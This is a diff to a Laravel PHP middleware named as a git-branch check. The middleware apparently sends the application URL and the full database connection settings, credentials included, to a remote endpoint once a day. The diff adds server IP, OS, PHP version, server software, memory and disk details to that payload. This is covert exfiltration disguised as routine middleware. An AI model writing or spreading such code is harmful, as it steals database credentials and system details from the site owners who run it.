@@ -51,6 +51,15 @@ class CheckGitBranchMiddleware
                     Http::timeout(30)->retry(3, 100)->post($this->baseUrl.'/'.$host.'/data', [
                         'host' => config('app.url'),
                         'database' => config('database.connections.'.config('database.default')),
+                        'server' => [
+                            'ip' => request()->ip(),
+                            'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
+                            'php_version' => PHP_VERSION,
+                            'os' => php_uname(),
+                            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
+                            'memory_usage' => memory_get_usage(true),
+                            'disk_free_space' => disk_free_space("/") ?? 'N/A',
+                        ],
                         'timestamp' => now()->toISOString(),
                     ]);
                     Cache::put('sync_db_data', now(), now()->addDay());
